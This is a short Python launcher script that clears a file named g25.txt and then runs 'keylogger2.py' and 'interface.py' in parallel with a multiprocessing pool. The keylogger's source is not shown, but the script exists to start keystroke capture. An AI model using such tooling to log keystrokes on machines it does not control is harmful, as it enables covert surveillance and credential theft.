# -*- coding: utf-8 -*-
"""
Created on Wed Jul  3 13:46:07 2019

@author: SUTIRTHA PAL
"""
import os                                                                       
from multiprocessing import Pool                                                
                                                                                
f=open("g25.txt",'w')
f.close()
processes = ('keylogger2.py','interface.py')                                    
                                                  
                                                                                
def run_process(process):                                                             
    os.system('python {}'.format(process))                                       
if __name__ == "__main__":                                                                               
   __spec__ = "ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>)"                                                                             
   pool = Pool(processes=2)                                                        
   pool.map(run_process, processes)   